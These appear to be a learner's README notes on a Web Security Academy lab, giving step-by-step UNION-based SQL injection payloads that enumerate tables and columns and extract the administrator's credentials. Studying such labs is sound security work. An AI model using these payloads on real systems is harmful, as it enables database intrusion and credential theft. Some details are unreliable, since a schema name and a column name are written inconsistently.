# SQLi-
In this Repository will be on SQL injection which learned from Web Security Academy

# Examining the database: SQL injection attack, listing the database contents on non-Oracle databases
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

# Suppose you find a SQL Injection vulnerability, but you do not know:
    table names
    column names
   database structure
Then the attack becomes a process of database enumeration.  

1. we have to check how much initial query can return columns we can  one or two:
  |--> '+UNION+SELECT+NULL--' --> for one column
  |--> '+UNION+SELECT+NULL,NULL--'  for two column

2.   then we have to know the information tables(meta data of the tables)
3.    '+UNION+SELECT+table_name,+NULL+FROM+table_schema.tables--'
        # table_schema is used for to find the metadata of the table

   then we have to manual find the table that contain the user credentials like example: 
   # users_tcadyp ---> name of the tab;le contain the credentials
4.  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tcadyp'--'
    shows--->     
    |---> email
    |--->password_onwjwp
    |---> username_saysjv

# Find the administrator cederitenials
'+UNION+SELECT+username_saysiv,+password_onwjwp+FROM+users_tcadyp--'
---> administrator
     5ptkbuxzohq9l6c22js3

